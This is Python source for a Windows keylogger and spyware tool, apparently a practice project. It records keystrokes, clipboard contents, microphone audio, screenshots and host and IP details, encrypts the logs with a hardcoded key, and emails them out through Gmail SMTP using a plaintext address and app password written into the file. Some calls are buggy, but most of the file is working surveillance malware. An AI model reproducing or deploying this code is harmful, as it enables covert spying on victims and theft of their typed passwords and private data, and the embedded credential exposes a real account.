from email.mime.audio import MIMEAudio
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet


from requests import get


from PIL import ImageGrab

import sys

keys_information = "key_log.txt"
system_information = "System_Info.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_system_Info.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10
time_itteration = 15
number_of_itteration_end = 3

email_address = "keyloggerpractice99@gmail.com"
password = "tcjr prsn ikpn xzuy"

toaddr = "keyloggerpractice99@gmail.com"

key = "3yRI8AwP2hlAN_pB1MFBFnHitz8v5nrau56wZbJSYa8="

file_path = "D:\\code\\pythonProject\\project"
extend = "\\"
file_mrge = file_path + extend

def send_email(filename, attachment, toaddr):
    fromaddr = email_address

    mag = MIMEMultipart()

    mag['From'] = fromaddr
    mag['To'] = toaddr
    mag['Subject'] = "lOG_files"

    body = "Body_of_the_mail"

    mag.attach(MIMEText(body, 'plain'))


    filename = filename

    attachment = open(attachment, 'rb')

    p = MIMEBase('application' , 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition',"attachment; filename= %s" % filename)

    mag.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = mag.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

send_email(keys_information, file_path+extend+keys_information, toaddr)
send_email(system_information, file_path+extend+system_information, toaddr)
send_email(clipboard_information, file_path+extend+clipboard_information, toaddr)

send_email(screenshot_information, file_path + extend + system_information , toaddr)

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP address: " + public_ip)

        except Exception:
             f.write("couldn't get public ip address most likely most query")

        f.write("Processor: " + (platform.processor()) + "\n")
        f.write("System:" + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private ip address: " + IPAddr + "\n")

computer_information()

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard_Data: \n" + pasted_data)

        except:
            f.write("clipboard couldn't copied")

copy_clipboard()


def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

microphone()

def screenshot():

       im = ImageGrab.grab()
       im.save(file_path + extend + screenshot_information)

screenshot()


number_of_itteration = 0
currentTime = time.time()
stopingTime = time.time() + time_itteration

while number_of_itteration < number_of_itteration_end:


    count = 0
    keys =[]

    def on_press(key):
        global keys, count , currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]
    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space")>0:
                    f.write('\n')
                    f.close()
                elif k.find("key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if Key == key.esc:
            sys.exit()
        if currentTime > stopingTime:
            sys.exit()

    with Listener(on_press=on_press, on_relase=on_release) as listener:
      listener.join()

    if currentTime > stopingTime:
        with open(file_path + extend + keys_information , "a") as f:
            f.write(" ")

        screenshot()


        copy_clipboard()

        number_of_itteration += 1

        currentTime = time.time()
        stopingTime = time.time() + time_itteration

files_to_encrypt = (file_mrge + system_information , file_mrge + clipboard_information , file_mrge + keys_information)
encrypted_file_name = (file_mrge + system_information_e , file_mrge + clipboard_information_e , file_mrge + keys_information_e)

count = 0

for encrypting_file in files_to_encrypt:

   with open(files_to_encrypt[count], 'rb') as f:
       data = f.read()

   fernet = Fernet(key)
   encrypted = fernet.encrypt(data)

   with open(encrypted_file_name[count], 'wb') as f:
       f.write(encrypted)

   send_email(encrypted_file_name[count], encrypted_file_name[count], toaddr)

   count += 1


time.sleep(120)